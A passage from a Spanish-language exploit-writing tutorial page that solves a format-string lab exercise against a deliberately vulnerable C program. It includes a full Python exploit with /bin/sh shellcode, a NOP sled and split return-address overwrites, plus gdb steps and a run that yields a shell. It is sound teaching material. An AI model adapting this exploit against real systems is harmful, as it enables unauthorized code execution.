<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"2"</span><span class="p">:</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
</code></pre></div>    </div>
    <p>Y averiguamos la dirección de <code class="highlighter-rouge">buf</code> pasándole ambos argumentos:</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span> ./r.sh gdb ./fs2 <span class="s2">"</span><span class="k">$(</span>./exploit.py 1<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>./exploit.py 2<span class="k">)</span><span class="s2">"</span>
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>main
<span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">"</span><span class="k">$(</span>./exploit.py 1<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>./exploit.py 2<span class="k">)</span><span class="s2">"</span>
Breakpoint 1, main <span class="o">(</span><span class="nv">argv</span><span class="o">=</span>3, <span class="nv">argc</span><span class="o">=</span>0xbffe7154<span class="o">)</span> at fs2.c:7
7         snprintf<span class="o">(</span>buf,sizeof buf,<span class="s2">"%s%c%c%hn"</span>,argc[1]<span class="o">)</span><span class="p">;</span>
<span class="o">(</span>gdb<span class="o">)</span> x/wx buf
0xbffe6fb8: 0x00000001
</code></pre></div>    </div>

    <p>Como siempre vamos a usar el mismo padding, es decir los argumentos van a tener siempre la misma longitud aunque editemos el bytecode del exploit, podemos estar seguros de que la dirección de <code class="highlighter-rouge">buf</code> en el exploit definitivo va a ser también <code class="highlighter-rouge">0xbffe6fb8</code>.</p>
  </li>
  <li>
    <p>Editamos el archivo <code class="highlighter-rouge">exploit.py</code> para pasar ambos inputs.         <br />
Como dijimos nos cuidamos de incluir el jump para evitar que se interrumpa el tobogán de NOPs antes de llegar al shellcode.    <br />
Y recordemos que sólo podemos sobreescribir la dirección de retorno de a dos bytes. Es por ello que al incluirla en el exploit la desglosamos en los dos bytes menos significativos de esa dirección (<code class="highlighter-rouge">ret_addr_low</code>) y los dos bytes más significativos ( <code class="highlighter-rouge">ret_addr_high</code>). Lo mismo sucede con la dirección de <code class="highlighter-rouge">buf</code> que vamos a escribir allí, con el primer input escribirmos la parte menos significativa de esa dirección (<code class="highlighter-rouge">buf_addr_low</code>) y con el segundo input escribimos los dos bytes más significativos (<code class="highlighter-rouge">buf_addr_high</code>).</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
   
<span class="s">"""Uso: ./fs2 "$(./exploit.py 1)" "$(./exploit.py 2)" "$(./exploit.py 3)" """</span>

<span class="kn">import</span> <span class="nn">sys</span>
   
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="n">shellcode</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">"</span>
   
<span class="n">buf_size</span> <span class="o">=</span> <span class="mi">256</span>
   
<span class="n">buf_addr</span>     <span class="o">=</span> <span class="mh">0xbffe6fb8</span>                              
   
<span class="n">buf_addr_low</span>  <span class="o">=</span> <span class="p">(</span><span class="n">buf_addr</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x0000ffff</span>
<span class="n">buf_addr_high</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x0000ffff</span>
   
<span class="n">ret_addr_low</span>  <span class="o">=</span> <span class="n">buf_addr</span> <span class="o">+</span> <span class="n">buf_size</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span>
<span class="n">ret_addr_high</span> <span class="o">=</span> <span class="n">buf_addr</span> <span class="o">+</span> <span class="n">buf_size</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span>
   
   
<span class="n">exploit_argv1</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x0a</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c"># \xeb\x0a == jmp 0xc</span>
<span class="n">exploit_argv1</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">exploit_argv1</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_high</span><span class="p">)</span>
<span class="n">exploit_argv1</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">40</span>
<span class="n">exploit_argv1</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">exploit_argv1</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">buf_addr_high</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">exploit_argv1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span>
   
<span class="n">exploit_argv2</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x0a</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c"># \xeb\x0a == jmp 0xc</span>
<span class="n">exploit_argv2</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">exploit_argv2</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_low</span><span class="p">)</span>
<span class="n">exploit_argv2</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">40</span>
<span class="n">exploit_argv2</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">exploit_argv2</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">buf_addr_low</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">exploit_argv2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span>
   
<span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100000</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">exploit_argv1</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">exploit_argv2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span>
   
   
<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit_argv1</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"2"</span><span class="p">:</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit_argv2</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"3"</span><span class="p">:</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Ejecutamos el exploit
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>./fs2 <span class="s2">"</span><span class="k">$(</span>./exploit.py 1<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>./exploit.py 2<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>./exploit.py 3<span class="k">)</span><span class="s2">"</span>
   
process 1537 is executing new program: /bin/dash
<span class="nv">$ </span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="layout-de-la-pila-después-del-exploit-1">Layout de la pila después del exploit:</h3>
<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/fs2/pila-exploit.png" alt="pila-3" /></p>

<h3 id="cómo-seguir">¿Cómo seguir?</h3>

<ol>
  <li><strong>Format String 3</strong>: lograr el ataque con una única escritura en <code class="highlighter-rouge">buf</code> de 2 bytes.</li>
</ol>

<h5 id="código-fuente-1">Código fuente</h5>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

        <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span> <span class="n">buf</span><span class="p">,</span><span class="s">"%s%c%c%hn"</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>


</div>

    </div>

  </body>
</html>
